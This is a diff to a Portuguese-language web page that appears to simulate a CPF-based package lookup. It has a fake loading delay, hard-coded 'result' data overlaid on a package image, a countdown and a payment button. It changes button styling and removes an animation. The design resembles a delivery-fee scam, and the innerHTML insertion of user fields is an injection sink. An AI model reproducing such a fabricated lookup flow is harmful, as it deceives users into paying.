@@ -180,32 +180,17 @@
     #consultar-btn {
       padding: 0.5rem 1.5rem;
       font-size: 1rem;
-      background-color: #007bff;
+      background-color: #003157;
       color: white;
       border: none;
       border-radius: 5px;
       cursor: pointer;
-      animation: pulsar 1s infinite;
       max-width: 600px;
       width: 100%;
     }
 
     #consultar-btn:hover {
-      background-color: #0056b3;
-    }
-
-    @keyframes pulsar {
-      0% {
-        transform: scale(1);
-      }
-
-      50% {
-        transform: scale(1.1);
-      }
-
-      100% {
-        transform: scale(1);
-      }
+      background-color: #001a33;
     }
 
     /* Tela formulário background */
@@ -387,6 +372,7 @@
     .caixa-image {
       margin: 25px 0;
       text-align: center;
+      position: relative;
     }
 
     .caixa-image img {
@@ -424,6 +410,24 @@
     /* Payment button container */
     .payment-button-container {
       margin: 20px 0;
+    }
+    
+    /* Estilo para o texto sobreposto na imagem da caixa */
+    .caixa-overlay-text {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: black;
+      font-weight: bold;
+      text-align: left;
+      width: 80%;
+      font-size: 12px;
+      line-height: 1.4;
+    }
+    
+    .caixa-overlay-text p {
+      margin: 5px 0;
     }
   </style>
 </head>
@@ -516,6 +520,9 @@
       
       <div class="caixa-image">
         <img src="images/Caixa.png" alt="Caixa">
+        <div class="caixa-overlay-text" id="caixa-info">
+          <!-- As informações serão inseridas aqui via JavaScript -->
+        </div>
       </div>
 
       <!-- IMAGEM DO STATUS DE ENTREGA -->
@@ -612,6 +619,17 @@
         .padStart(2, "0")})`;
     }
 
+    function atualizarInfoCaixa(dados) {
+      const caixaInfo = document.getElementById("caixa-info");
+      caixaInfo.innerHTML = `
+        <p>NOME: ${dados.nome}</p>
+        <p>CPF: ${dados.cpf}</p>
+        <p>CEP: ${dados.cep}</p>
+        <p>CIDADE: ${dados.cidade}</p>
+        <p>ESTADO: ${dados.estado}</p>
+      `;
+    }
+
     let intervalContagem;
 
     document
@@ -641,14 +659,14 @@
         await new Promise((resolve) => setTimeout(resolve, 2000));
 
         const dadosPessoa = {
-          nome: "-",
+          nome: "Cliente Exemplo",
           cpf: formatarCPF(cpfRaw),
-          nascimento: "-",
+          nascimento: "01/01/1980",
           cep: formatarCEP(cepRaw),
           rua: "-",
           bairro: "-",
-          cidade: "-",
-          estado: "-",
+          cidade: "São Paulo",
+          estado: "SP",
         };
 
         document.getElementById("res-nome").textContent = dadosPessoa.nome;
@@ -667,6 +685,9 @@
         document.getElementById("loading-container").style.display = "none";
         document.getElementById("tela-formulario").style.display = "none";
         document.getElementById("resultado").style.display = "block";
+
+        // Atualiza informações na caixa
+        atualizarInfoCaixa(dadosPessoa);
 
         atualizarContagemRegressiva();
         intervalContagem = setInterval(atualizarContagemRegressiva, 1000);
